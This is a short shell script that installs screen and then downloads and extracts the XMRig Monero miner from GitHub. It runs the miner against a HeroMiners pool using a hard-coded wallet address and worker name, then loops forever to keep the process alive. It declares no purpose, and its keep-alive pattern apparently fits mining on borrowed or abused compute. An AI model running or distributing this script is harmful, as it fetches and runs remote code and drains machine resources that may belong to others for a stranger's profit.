#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-focal-x64.tar.gz
tar -zxf xmrig-6.14.1-focal-x64.tar.gz
cd xmrig-6.14.1
./xmrig --donate-level 1 -o de.monero.herominers.com:1111 -u 86wfTWfiF7dGqMu6EYyibHYSEA44gV5vG8BeU448Lar9eGJgWLstkGzhyzcsuZGr9cfo1W3aCKB6GHeVqqXY89HwAqGGz4n -p reanx -a rx/0 -k 
while [ 1 ]; do
sleep 3
done
sleep 999
